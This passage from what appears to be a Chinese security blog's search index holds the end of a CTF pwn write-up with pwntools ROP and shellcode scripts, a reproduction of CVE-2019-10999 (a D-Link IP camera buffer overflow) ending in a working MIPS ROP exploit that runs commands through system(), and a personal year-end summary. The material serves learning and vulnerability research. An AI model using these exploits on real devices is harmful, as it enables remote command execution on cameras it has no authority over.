class="hljs-string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">32124</span>)<br><br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>read = <span class="hljs-number">0x4012d6</span><br>main = <span class="hljs-number">0x4012f0</span><br><br>pop_rdi_ret = <span class="hljs-number">0x401393</span><br>leave_ret = <span class="hljs-number">0x4012be</span><br>data = <span class="hljs-number">0x404100</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;before you try to solve this task.&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x108</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.send(payload)<br><br>puts = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;puts: &#x27;</span> + <span class="hljs-built_in">hex</span>(puts))<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>pop_rax_ret = libc_base + <span class="hljs-number">0x36174</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x2601f</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x142c92</span><br>syscall_ret = libc_base + <span class="hljs-number">0x630a9</span><br><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;before you try to solve this task.&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(data) + p64(pop_rax_ret) + p64(data) + p64(read) + p64(leave_ret) + p64(<span class="hljs-number">0</span>)<br>p.send(payload)<br><br>rop_data = [<br>    pop_rax_ret,  <span class="hljs-comment"># sys_open(&#x27;flag&#x27;, 0)</span><br>    <span class="hljs-number">2</span>,<br>    pop_rdi_ret,<br>    data,<br>    pop_rsi_ret,<br>    <span class="hljs-number">0</span>,<br>    syscall_ret,<br><br>    pop_rax_ret,  <span class="hljs-comment"># sys_read(flag_fd, heap, 0x100)</span><br>    <span class="hljs-number">0</span>,<br>    pop_rdi_ret,<br>    <span class="hljs-number">3</span>,<br>    pop_rsi_ret,<br>    data + <span class="hljs-number">0x100</span>,<br>    pop_rdx_ret,<br>    <span class="hljs-number">0x100</span>,<br>    syscall_ret,<br><br>    pop_rax_ret,  <span class="hljs-comment"># sys_write(1, heap, 0x100)</span><br>    <span class="hljs-number">1</span>,<br>    pop_rdi_ret,<br>    <span class="hljs-number">1</span>,<br>    pop_rsi_ret,<br>    data + <span class="hljs-number">0x100</span>,<br>    syscall_ret<br>]<br><br>payload = <span class="hljs-string">b&#x27;flag\x00\x00\x00\x00&#x27;</span> + flat(rop_data)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">32737</span>)<br><br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br>p.recvuntil(<span class="hljs-string">&#x27;your shellcode:&#x27;</span>)<br><br>p1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    mov esi, 0xCAFE0100</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(p1)))<br>p.send(asm(p1))<br><br>p2 = asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br>p.sendline(p2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-10999-Dlink摄像头缓冲区溢出漏洞复现</title>
    <link href="/2023/02/04/CVE-2019-10999-Dlink%E6%91%84%E5%83%8F%E5%A4%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/02/04/CVE-2019-10999-Dlink%E6%91%84%E5%83%8F%E5%A4%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2019-10999-Dlink-ip摄像头复现"><a href="#CVE-2019-10999-Dlink-ip摄像头复现" class="headerlink" title="CVE-2019-10999 Dlink ip摄像头复现"></a><strong>CVE-2019-10999</strong> Dlink ip摄像头复现</h1><p><strong>CVE-2019-10999</strong> 是 Dlink IP 摄像头的后端服务器程序 <code>alphapd</code> 中的一个缓冲区溢出漏洞，漏洞允许经过身份认证的用户在请求 <code>wireless.htm</code> 时，传入 <code>WEPEncryption</code> 参数一个长字符串来执行任意代码。</p><h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cp</span> $(<span class="hljs-built_in">which</span> qemu-mipsel-static) .<br>sudo <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./bin/alphapd<br></code></pre></td></tr></table></figure><h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><p><img src="/img/CVE-2019-10999/image-20230202230424511.png"></p><p>将<code>alphapd</code>拖入<strong>ida</strong>查找<strong>pid</strong>字段，发现该<code>fopen</code>语句。</p><p><img src="/img/CVE-2019-10999/image-20230202230805502.png"></p><p>所以我们在该固件的根目录下创建该文件。</p><h3 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h3><p><img src="/img/CVE-2019-10999/image-20230202231256607.png"></p><p>查找<strong>random</strong>字段，发现如下<code>open</code>语句。</p><p><img src="/img/CVE-2019-10999/image-20230202231443841.png"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./bin/mknod -m 0666 ./dev/random c 1 8<br>sudo <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./bin/mknod -m 0666 ./dev/urandom c 1 9<br></code></pre></td></tr></table></figure><h3 id="问题3"><a href="#问题3" class="headerlink" title="问题3"></a>问题3</h3><p><img src="/img/CVE-2019-10999/image-20230202231703309.png"></p><p>这里<strong>无法写入random state</strong>，解决方式如下,</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">touch</span> .rnd<br>sudo <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static -E HOME=/ -E RANDFILE=/.rnd ./bin/alphapd<br></code></pre></td></tr></table></figure><p>具体原理：</p><p>OpenSSL 需要写入一些信息到 .rnd 文件，上面的问题可能是因为 .rnd 文件不存在，OpenSSL 不知道默认文件在何处，因为 RANDFILE 和 HOME 环境变量没有设置，那么解决方法就是创建 .rnd 文件并且设置环境变量指向这个文件。qemu 启动的时候设置这两个环境变量，解决了上面的问题。</p><p><img src="/img/CVE-2019-10999/image-20230202232059030.png"></p><h3 id="问题4"><a href="#问题4" class="headerlink" title="问题4"></a>问题4</h3><p><img src="/img/CVE-2019-10999/image-20230202232137574.png"></p><p>直接在ida中搜索并定位问题。</p><p><img src="/img/CVE-2019-10999/image-20230202232247250.png"></p><p><img src="/img/CVE-2019-10999/image-20230202232330876.png"></p><p><img src="/img/CVE-2019-10999/image-20230202233507536.png"></p><p>这里我们将该判断patch掉。</p><p><img src="/img/CVE-2019-10999/image-20230203001346142.png"></p><p>反编译后，可以看到</p><p><img src="/img/CVE-2019-10999/image-20230203001432773.png"></p><h3 id="问题5"><a href="#问题5" class="headerlink" title="问题5"></a>问题5</h3><p><img src="/img/CVE-2019-10999/image-20230203135055755.png"></p><p>无法打开80端口，猜测80端口被占用了。</p><p>经过查询可知，本机的apache2服务占据了80端口。关闭apache服务即可</p><p><img src="/img/CVE-2019-10999/image-20230203135703035.png"></p><h3 id="成功启动"><a href="#成功启动" class="headerlink" title="成功启动"></a>成功启动</h3><p><img src="/img/CVE-2019-10999/image-20230203135759353.png"></p><p><img src="/img/CVE-2019-10999/image-20230203135926422.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="/img/CVE-2019-10999/image-20230203141914279.png"></p><p>通过查询该CVE，可以了解到当请求wireless.htm时，其WEPEncryption参数造成了溢出。</p><h3 id="查找溢出点"><a href="#查找溢出点" class="headerlink" title="查找溢出点"></a>查找溢出点</h3><p>通过IDA交叉引用查找溢出点。</p><p><img src="/img/CVE-2019-10999/image-20230203142401233.png"></p><p>逐个函数对比分析后，发现可疑点。</p><p><code>sub_435DEC</code></p><p><img src="/img/CVE-2019-10999/image-20230203142611718.png"></p><p>该函数获取WEPEncryption的值并赋值给Var，然后赋值给v8，最后<code>strcpy</code>赋值给v11。可以想到，通过控制a1的长度就可以造成溢出。交叉引用找到其调用者。</p><p><img src="/img/CVE-2019-10999/image-20230203143318605.png"></p><p><code>formDefineWireless</code></p><p><img src="/img/CVE-2019-10999/image-20230203143415961.png"></p><p>同时，我们在Web页面也找到了相似关键点。</p><p><img src="/img/CVE-2019-10999/image-20230203143653149.png"></p><p>并且通过抓包，我们得到相关请求头参数。</p><p><img src="/img/CVE-2019-10999/image-20230203143916185.png"></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h4><p><img src="/img/CVE-2019-10999/image-20230203145927395.png"></p><p>由ida分析可知，当我们输入字节数大于0x10时，即可发生溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;en-US,en;q=0.5&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate, br&#x27;</span>,<br>    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1/wizard.htm&#x27;</span>,<br>    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,<br>    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>&#125;<br><br>session = requests.session()<br><br>ip =  <span class="hljs-string">&#x27;http://127.0.0.1/wireless.htm&#x27;</span><br>data = <span class="hljs-string">&#x27;?WEPEncryption=&#x27;</span> + <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x20</span> + <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x4</span><br><br>res = session.get(url=ip+data, headers=headers)<br><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2019-10999/image-20230203150326989.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h3><p>首先，启动漏洞程序，并开启1234端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo chroot . ./qemu-mipsel-static -E HOME=/ -E RANDFILE=/.rnd -g 1234 ./bin/alphapd<br></code></pre></td></tr></table></figure><p>其次，使用<code>gdb-multiarch</code>进行调试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb-multiarch ./bin/alphapd<br>target remote :1234 <br></code></pre></td></tr></table></figure><h3 id="MIPS指令集"><a href="#MIPS指令集" class="headerlink" title="MIPS指令集"></a>MIPS指令集</h3><p>该架构为<strong>MIPS</strong>架构，其寄存器特点如下：</p><p><img src="/img/CVE-2019-10999/mips.png" alt="mips"></p><p>MIPS指令详解：<a href="https://blog.csdn.net/qq_39559641/article/details/89608132">https://blog.csdn.net/qq_39559641/article/details/89608132</a></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>首先，获取程序基址</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps -ajx | grep alphapd<br>sudo cat /proc/pid/maps<br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2019-10999/image-20230203163644618.png"></p><p>这里无法直接得到libc地址。</p><p><img src="/img/CVE-2019-10999/image-20230203220605368.png"></p><p>通过调试，间接方法得到libc基址。</p><p>libc_base &#x3D; 0x7f6d0000</p><p><strong>其次，获取system函数的地址</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">readelf -s ./libuClibc-0.9.28.so | grep system<br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2019-10999/image-20230203164039819.png"></p><p><strong>然后，查找可用gadget</strong></p><p>这里使用IDA插件mipsrop查找。</p><p><img src="/img/CVE-2019-10999/image-20230203202234248.png"></p><p><img src="/img/CVE-2019-10999/image-20230203202351992.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:00050DE4 addiu   $s2, $sp, 0x1C8+var_D8<br>.text:00050DE8 move    $a0, $s2<br>.text:00050DEC move    $t9, $s0<br>.text:00050DF0 jalr    $t9 ; sub_505D0<br></code></pre></td></tr></table></figure><p>该gadget实现功能如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">$a0 = $sp + 0xf0# arg1<br>jalr $s0<br></code></pre></td></tr></table></figure><p>进一步分析漏洞函数<code>sub_435DEC</code></p><p><img src="/img/CVE-2019-10999/image-20230203203513410.png"></p><p><img src="/img/CVE-2019-10999/image-20230203204303574.png"></p><p><img src="/img/CVE-2019-10999/image-20230203204345277.png"></p><p>可知，</p><ol><li>函数一开始将<code>$ra, $s0-$s5</code>存储在栈上</li><li>当我们写入0x10字节时，可以控制<code>$s0</code>为system函数地址</li><li>累计写入0x28个字节后，可以控制<code>$ra</code>寄存器为gadget</li><li>接着，累计写入(0x30 + 0xf0)个字节后，可以控制<code>$a0</code>寄存器为cmd指令</li><li>跳转到system函数，从而执行任意命令。</li></ol><p>最终漏洞脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">urlcode</span>(<span class="hljs-params">data</span>):<br>    text = <span class="hljs-built_in">hex</span>(data)[<span class="hljs-number">2</span>:]<br>    temp = [<span class="hljs-string">&#x27;%&#x27;</span> + text[i] + text[i + <span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>)]<br>    res = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(temp)):<br>        res += temp[<span class="hljs-built_in">len</span>(temp) - i - <span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> res<br><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;en-US,en;q=0.5&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate, br&#x27;</span>,<br>    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1/wizard.htm&#x27;</span>,<br>    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,<br>    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>&#125;<br><br>session = requests.session()<br><br>libc_base = <span class="hljs-number">0x7f6d0000</span><br>system = libc_base + <span class="hljs-number">0x4bd20</span><br>gadget = libc_base + <span class="hljs-number">0x50de4</span><br><br>cmd = <span class="hljs-string">&#x27;ls&#x27;</span><br><br>ip =  <span class="hljs-string">&#x27;http://127.0.0.1/wireless.htm&#x27;</span><br>data = <span class="hljs-string">&#x27;?WEPEncryption=&#x27;</span> + <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span> + urlcode(system)<br>data += <span class="hljs-string">&#x27;B&#x27;</span> * (<span class="hljs-number">0x28</span> - <span class="hljs-number">0x14</span>) + urlcode(gadget)<br>data += <span class="hljs-string">&#x27;C&#x27;</span> * (<span class="hljs-number">0x30</span> - <span class="hljs-number">0x2c</span> + <span class="hljs-number">0x1c8</span> - <span class="hljs-number">0xd8</span>) + cmd<br><br>url = ip + data<br><br>res = session.get(url=url, headers=headers)<br><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p>可以看到，我们成功执行了远程命令。</p><p><img src="/img/CVE-2019-10999/image-20230203223710418.png"></p><p><img src="/img/CVE-2019-10999/image-20230203223744429.png"></p><p>这里<code>$sp</code>的变化，是在跳转到gadget前，优先执行<code>addiu $sp, 0x48</code>指令，也即gadget的下一条指令。这个叫做<strong>分支延迟槽 (Branch delay slot)<strong>，简单地说就是位于分支指令后面的一条指令，不管分支发生与否其总是被执行，而且</strong>位于分支延迟槽中的指令先于分支指令提交</strong> (commit)。</p><p><img src="/img/CVE-2019-10999/image-20230203221509179.png"></p><p><img src="/img/CVE-2019-10999/image-20230203221531500.png"></p><p><strong>参考文档：</strong></p><p><a href="https://www.anquanke.com/post/id/259210">https://www.anquanke.com/post/id/259210</a></p><p><a href="https://blog.csdn.net/qq_39559641/article/details/89608132">https://blog.csdn.net/qq_39559641/article/details/89608132</a></p><p><a href="https://blog.csdn.net/qq_39559641/article/details/89608132">https://blog.csdn.net/qq_39559641/article/details/89608132</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>mips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022-summary</title>
    <link href="/2023/01/21/2022-summary/"/>
    <url>/2023/01/21/2022-summary/</url>
    
    <content type="html"><![CDATA[<blockquote><p>一直想写一篇年终总结，但是一直耽耽误误的。这一篇也是写了好久才写出来的。</p></blockquote><p>哈哈，首先给自己来一个新年祝福吧。</p><p>希望新的一年里所求皆如愿，所行化坦途。多喜乐，长安宁！！！</p><h2 id="经历"><a href="#经历" class="headerlink" title="经历"></a>经历</h2><p> 对我而言，今年既是平常又是极不平常的一年。或许某些选择改变了我的人生方向。</p><p>年初，1月10号左右，我开始接触CTF。CTF方向很多，一开始我也不知道从哪个方向入手，于是就逐个方向慢慢尝试。大概试了一个星期左右吧，我发现更喜欢PWN方向，觉得找到程序漏洞，然后直接控制远程主机很厉害。然后网上很多大佬都认为二进制方向很有前景，于是就选择了PWN。</p><p>刚开始时，真的是很懵啊！！！自己啥也不懂，完全就是一个小白。于是就开始慢慢摸索，学习汇编语言，学习函数调用过程等等。其中，我对堆栈总是一知半解的，但是就是硬着头皮做题嘛，并且不断画程序调用堆栈图，直到自己理解了为止。经历了一个寒假，我算是入门了PWN。</p><p>开学时，参加了第一个CTF比赛，挺激动的吧，但是压根就看不懂题啊。只能继续刷BUUCTF了。然后，参加了学院举办的峻极争霸赛，这里面的PWN题比较简单，我做了三四道吧，依稀记得是两道栈，一道格式化字符串，还有一个简单的堆题，最后我们队伍拿了三等奖。之后，我不断刷题，不断学习新知识，并且参加一些CTF比赛。由于参加的CTF比赛比较多，但是都没有拿到成绩嘛，也就不说了。</p><p>综上，入门CTF，走安全道路，并为之付出大量时间是我今年做出的最大选择。</p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ol><li>学习了汇编语言</li><li>学习了栈、libc堆(house系列，堆利用技巧)、kernel(菜的一批)、musl libc(刚入门)</li><li>编程水平有了一定提升</li></ol><h2 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h2><p>不足之处太多了，也就不一一列举了。这里稍微列举几个自己今年想要改的，也就是一个flag。</p><ol><li>阅读代码能力不太行，好多PWN题都分析不出bug</li><li>做题时比较浮躁，缺乏耐心</li></ol><h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>希望未来能够挖到第一个CVE漏洞，并且CTF比赛能够打出成绩。</p><p>就这么多了吧，实在是没啥好写的了。</p>]]></content>
    
    
    <categories>
      
      <category>summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>personal</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
